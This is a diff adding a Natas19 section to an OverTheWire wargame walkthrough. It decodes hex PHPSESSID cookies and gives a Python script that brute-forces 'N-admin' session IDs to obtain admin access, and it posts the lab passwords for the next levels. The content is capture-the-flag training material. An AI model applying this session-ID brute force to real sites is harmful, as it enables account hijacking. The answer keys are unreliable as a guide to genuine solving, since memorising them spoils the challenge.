@@ -503,3 +503,50 @@ for i in range(640):
 username: natas19
 password: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs 
 ```
+
+**[Natas19](http://natas19.natas.labs.overthewire.org)**  
+The hint says that
+```
+This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
+```
+Try to login with
+```
+username: a
+password: a
+```
+We got hex value in session
+```
+3538332d61
+```
+Convert it to text
+```
+583-a
+```
+Delete cookie, repeat login again, we got
+```
+120-a
+```
+Assume that random a number and concat with your username, we try to brute force
+```python
+import requests
+import string
+
+url = 'http://natas19.natas.labs.overthewire.org/'
+auth = ('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')
+i = 0;
+while True:
+    value = str(i) + '-admin';
+    cookies = {'PHPSESSID': value.encode('utf-8').hex()}
+    x = requests.post(url, auth=(auth), cookies=cookies)
+    print(i, value.encode('utf-8').hex())
+    i = i + 1;
+    if ('You are an admin.' in x.text):
+        print(x.text)
+        break
+```
+```
+username: natas20
+password: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF 
+```
+
+**[Natas20](http://natas20.natas.labs.overthewire.org)**  
